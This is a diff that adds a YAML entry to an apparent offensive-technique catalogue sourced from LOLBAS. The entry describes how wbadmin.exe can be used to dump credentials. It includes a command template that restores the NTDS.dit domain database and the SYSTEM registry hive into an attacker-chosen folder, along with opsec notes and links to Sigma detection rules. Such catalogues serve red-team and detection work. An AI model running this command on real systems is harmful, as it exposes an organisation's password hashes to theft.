@@ -1,0 +1,34 @@
+id: lolbas/wbadmin/dump/1
+type: binary
+platform: windows
+name: wbadmin.exe
+phases:
+- credential-access
+capabilities:
+- credential-dump
+privilege_required: specific-right
+sources:
+- project: LOLBAS
+  upstream_url: https://lolbas-project.github.io
+  license: GPL-3.0 (verify upstream LICENSE)
+  upstream_version: 9c5e384
+  last_synced: '2026-08-25'
+attack_techniques:
+- T1003.003
+opsec:
+  noise: high
+  triggers: wbadmin.exe command lines containing "NTDS" or "NTDS.dit"
+  detection_refs:
+  - https://github.com/SigmaHQ/sigma/blob/c7998c92b3c5f23ea67045bee8ee364d2ed1a775/rules/windows/process_creation/proc_creation_win_wbadmin_dump_sensitive_files.yml
+  - https://github.com/SigmaHQ/sigma/blob/c7998c92b3c5f23ea67045bee8ee364d2ed1a775/rules/windows/process_creation/proc_creation_win_wbadmin_restore_file.yml
+  - https://github.com/SigmaHQ/sigma/blob/c7998c92b3c5f23ea67045bee8ee364d2ed1a775/rules/windows/process_creation/proc_creation_win_wbadmin_restore_sensitive_files.yml
+commands:
+- template: wbadmin start recovery -version:<VERSIONIDENTIFIER> -recoverytarget:{PATH_ABSOLUTE:folder}
+    -itemtype:file -items:C:\Windows\NTDS\NTDS.dit,C:\Windows\System32\config\SYSTEM -notRestoreAcl -quiet
+  comment: Restore a version of NTDS.dit and SYSTEM hive into file path. The command `wbadmin get versions`
+    can be used to find version identifiers.
+references:
+- https://lolbas-project.github.io/lolbas/Binaries/Wbadmin/
+tags:
+- windows
+- lolbas
